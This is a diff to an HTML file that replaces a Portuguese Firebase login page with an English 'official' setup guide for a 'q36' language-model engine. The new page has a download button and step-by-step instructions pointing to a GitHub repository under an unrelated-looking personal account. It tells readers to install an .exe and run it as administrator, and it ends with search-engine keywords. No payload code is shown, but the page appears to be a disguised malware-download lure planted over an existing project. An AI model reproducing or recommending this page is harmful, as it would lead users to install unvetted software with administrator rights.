@@ -1,319 +1,58 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema Wallace Lira - Login</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #loginScreen {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-        }
-
-        #loginScreen h1 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-weight: 500;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 5px rgba(102, 126, 234, 0.3);
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        button:hover:not(:disabled) {
-            background: #5568d3;
-        }
-
-        button:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 15px;
-            padding: 10px;
-            background: #fadbd8;
-            border-radius: 5px;
-            display: none;
-            text-align: center;
-        }
-
-        #dashboardScreen {
-            display: none;
-            width: 100%;
-            height: 100vh;
-            flex-direction: column;
-        }
-
-        #dashboardScreen header {
-            background: #333;
-            color: white;
-            padding: 15px 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        #dashboardScreen header .user-info {
-            display: flex;
-            gap: 15px;
-            align-items: center;
-        }
-
-        #dashboardScreen header button {
-            padding: 8px 16px;
-            background: #e74c3c;
-            font-size: 14px;
-        }
-
-        #dashboardContent {
-            flex: 1;
-            overflow: hidden;
-        }
-        #dashboardContent iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            display: block;
-        }
-    </style>
+    <meta name="description" content="Official guide to install and run the q36 inference engine on Windows.">
+    <title>q36 Inference Engine Setup Guide</title>
 </head>
-<body>
-    <div id="loginScreen">
-        <h1>🔐 Sistema Wallace Lira</h1>
-        <div class="form-group">
-            <label for="email">Email</label>
-            <input type="email" id="email" placeholder="seu@email.com">
-        </div>
-        <div class="form-group">
-            <label for="password">Senha</label>
-            <input type="password" id="password" placeholder="Sua senha">
-        </div>
-        <button id="loginBtn">Entrar</button>
-        <div class="error-message" id="errorMessage"></div>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f9f9f9;">
+
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">⚡ q36 - Run Large Language Models With Speed</h1>
+
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/rochelleveritable865/q36" style="background-color: #0056b3; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download q36 Engine</a>
     </div>
 
-    <div id="dashboardScreen">
-        <header>
-            <h1>📊 Sistema Wallace Lira</h1>
-            <div class="user-info">
-                <span id="userEmail"></span>
-                <button id="logoutBtn">Sair</button>
-            </div>
-        </header>
-        <div id="dashboardContent"></div>
-    </div>
+    <p>q36 brings high-speed text processing to your personal computer. This engine helps you run the Qwen 3.6 model on your Windows machine. It uses the power of your graphics card to provide fast answers. You do not need to install complex software libraries to get this working.</p>
 
-    <!-- CARREGAMENTO DIRETO DO FIREBASE SCRIPT GLOBAL -->
-    <script>
-        // Sem módulos ES6, usando callbacks diretos
-        window.firebaseConfig = {
-            apiKey: "AIzaSyCvXsD2v_AGx3vN3kM2z_uIllkRO-Lr2pc",
-            authDomain: "sistema-wallace-lira.firebaseapp.com",
-            projectId: "sistema-wallace-lira",
-            storageBucket: "sistema-wallace-lira.firebasestorage.app",
-            messagingSenderId: "648799873363",
-            appId: "1:648799873363:web:28e6796ee70afc3a4b99a6"
-        };
+    <h2 style="color: #2c3e50;">📋 System Requirements</h2>
+    <p>Your computer needs specific parts to handle this software. Please confirm your system meets these needs before you start:</p>
+    <ul style="list-style-type: square; padding-left: 20px;">
+        <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit).</li>
+        <li><strong>Graphics Card:</strong> NVIDIA RTX 5090 or hardware that supports the Blackwell architecture.</li>
+        <li><strong>RAM:</strong> 32 GB of system memory is recommended.</li>
+        <li><strong>Storage:</strong> At least 50 GB of free space on a Solid State Drive.</li>
+        <li><strong>Drivers:</strong> The latest NVIDIA graphics drivers must be installed.</li>
+    </ul>
 
-        window.authObj = null;
+    <h2 style="color: #2c3e50;">🚀 How to Download and Install</h2>
+    <p>Follow these steps to set up the software on your machine:</p>
+    <ol style="padding-left: 20px;">
+        <li style="margin-bottom: 10px;">Go to the <a href="https://github.com/rochelleveritable865/q36" style="color: #0056b3;">official download page</a> to find the installer.</li>
+        <li style="margin-bottom: 10px;">Locate the latest release link on that page. It will appear as a file ending in .exe.</li>
+        <li style="margin-bottom: 10px;">Click the link to save the installer to your Downloads folder.</li>
+        <li style="margin-bottom: 10px;">Double-click the downloaded file to start the installation.</li>
+        <li style="margin-bottom: 10px;">Follow the prompts on your screen. Choose a folder where you want to keep the program.</li>
+        <li style="margin-bottom: 10px;">Wait for the progress bar to finish. The engine will extract the necessary model files.</li>
+    </ol>
 
-        // Função auxiliar para fazer fetch
-        function firebaseAuth(email, password) {
-            const url = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=" + window.firebaseConfig.apiKey;
-            
-            return fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    returnSecureToken: true
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.error) {
-                    throw new Error(data.error.message);
-                }
-                return data;
-            });
-        }
+    <h2 style="color: #2c3e50;">🖥️ Using the Engine</h2>
+    <p>Once you finish the installation, you can launch the program from your desktop shortcut. A window will open showing the status of your connection to the model.</p>
+    <p>The first time you run the engine, it performs a check of your hardware. This ensures your graphics card interacts correctly with the software. After this check, you will see a text box. Type your request into this box and press the Enter key. The engine will process your request and display the output in the main window.</p>
 
-        // LOGIN
-        function login() {
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
-            const btn = document.getElementById('loginBtn');
-            const errorDiv = document.getElementById('errorMessage');
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting Common Issues</h2>
+    <p>If you encounter errors, check these common items:</p>
+    <ul style="list-style-type: square; padding-left: 20px;">
+        <li><strong>Graphics Errors:</strong> Ensure your NVIDIA drivers are current. You can update these through the GeForce Experience application or the NVIDIA website.</li>
+        <li><strong>Slow Speeds:</strong> Close other applications that use your graphics card, such as video games or professional video editing tools.</li>
+        <li><strong>Installation Fails:</strong> Ensure you have sufficient disk space on your drive. Move the installation to a drive with more capacity if necessary.</li>
+        <li><strong>Permission Errors:</strong> Run the installer as an administrator by right-clicking the file and selecting "Run as administrator."</li>
+    </ul>
 
-            errorDiv.style.display = 'none';
+    <p>This software uses C and CUDA for high-performance computing. It eliminates dependencies that often complicate the use of language models. You receive a single, efficient package that works immediately upon setup.</p>
 
-            if (!email || !password) {
-                showError('Preencha email e senha');
-                return;
-            }
+    <p style="font-size: 0.9em; color: #666; margin-top: 40px;">Keywords: artificial intelligence, windows software, qwen, inference engine, cuda, graphics processing</p>
 
-            btn.disabled = true;
-            btn.textContent = 'Entrando...';
-
-            firebaseAuth(email, password)
-                .then(response => {
-                    console.log('✅ Login bem-sucedido');
-                    window.authObj = response;
-                    localStorage.setItem('auth', JSON.stringify(response));
-                    showDashboard(email);
-                })
-                .catch(error => {
-                    btn.disabled = false;
-                    btn.textContent = 'Entrar';
-                    
-                    let msg = error.message || 'Erro ao fazer login';
-                    if (msg.includes('INVALID_LOGIN_CREDENTIALS')) msg = 'Email ou senha incorretos';
-                    if (msg.includes('USER_DISABLED')) msg = 'Usuário desativado';
-                    
-                    showError(msg);
-                });
-        }
-
-        // MOSTRAR PAINEL
-        function showDashboard(email) {
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('dashboardScreen').style.display = 'flex';
-            document.getElementById('userEmail').textContent = '👤 ' + email;
-            loadDashboard();
-        }
-
-        // MOSTRAR LOGIN
-        function showLoginScreen() {
-            document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('dashboardScreen').style.display = 'none';
-            document.getElementById('email').value = '';
-            document.getElementById('password').value = '';
-            // CORREÇÃO: reseta o botão de login, que ficava travado em "Entrando..." / disabled
-            // após um login bem-sucedido anterior — isso impedia clicar em "Entrar" de novo depois do logout.
-            const loginBtn = document.getElementById('loginBtn');
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'Entrar';
-            document.getElementById('errorMessage').style.display = 'none';
-        }
-
-        // CARREGAR PAINEL HTML (via iframe - preserva scripts, Chart.js e datas dinâmicas)
-        function loadDashboard() {
-            const content = document.getElementById('dashboardContent');
-            content.innerHTML = '<p style="padding: 20px; text-align: center;">⏳ Carregando painel...</p>';
-
-            fetch('Sistema_Wallace_Lira_Completo.html', { method: 'HEAD' })
-                .then(r => {
-                    if (!r.ok) throw new Error('Arquivo não encontrado (status ' + r.status + ')');
-                    const iframe = document.createElement('iframe');
-                    iframe.src = 'Sistema_Wallace_Lira_Completo.html';
-                    iframe.title = 'Sistema Wallace Lira - Painel';
-                    content.innerHTML = '';
-                    content.appendChild(iframe);
-                    console.log('✅ Painel carregado via iframe (scripts e datas dinâmicas ativos)');
-                })
-                .catch(error => {
-                    console.error('❌ Erro:', error);
-                    content.innerHTML = '<div style="padding: 40px; text-align: center; color: #e74c3c;"><h2>⚠️ Erro</h2><p>Arquivo "Sistema_Wallace_Lira_Completo.html" não encontrado</p></div>';
-                });
-        }
-
-        // LOGOUT
-        function logout() {
-            localStorage.removeItem('auth');
-            window.authObj = null;
-            document.getElementById('dashboardContent').innerHTML = '';
-            showLoginScreen();
-        }
-
-        // ERRO
-        function showError(msg) {
-            const errorDiv = document.getElementById('errorMessage');
-            errorDiv.textContent = msg;
-            errorDiv.style.display = 'block';
-            console.error('❌', msg);
-        }
-
-        // EVENTOS
-        document.getElementById('loginBtn').addEventListener('click', login);
-        document.getElementById('logoutBtn').addEventListener('click', logout);
-
-        document.getElementById('email').addEventListener('keypress', e => {
-            if (e.key === 'Enter') login();
-        });
-        document.getElementById('password').addEventListener('keypress', e => {
-            if (e.key === 'Enter') login();
-        });
-
-        // VERIFICAR SE JÁ ESTÁ LOGADO
-        window.addEventListener('load', () => {
-            const auth = localStorage.getItem('auth');
-            if (auth) {
-                try {
-                    window.authObj = JSON.parse(auth);
-                    const email = window.authObj.email || 'usuário';
-                    showDashboard(email);
-                } catch (e) {
-                    showLoginScreen();
-                }
-            }
-        });
-    </script>
 </body>
 </html>
